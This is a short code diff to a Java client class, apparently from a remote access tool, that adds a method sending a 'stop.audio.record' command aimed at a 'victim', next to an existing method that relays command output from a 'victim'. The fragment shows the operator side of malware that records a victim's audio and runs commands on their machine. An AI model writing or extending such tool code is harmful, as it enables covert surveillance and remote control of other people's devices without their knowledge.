@@ -174,6 +174,14 @@ public class User extends Client {
         sendMessage(query);
     }
 
+    void sendStopAudioRecord(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "stop.audio.record");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
     void sendCmd(String out, String errorOut, String victim) {
         JSONObject query = new JSONObject();
         query.put("action", "cmd");
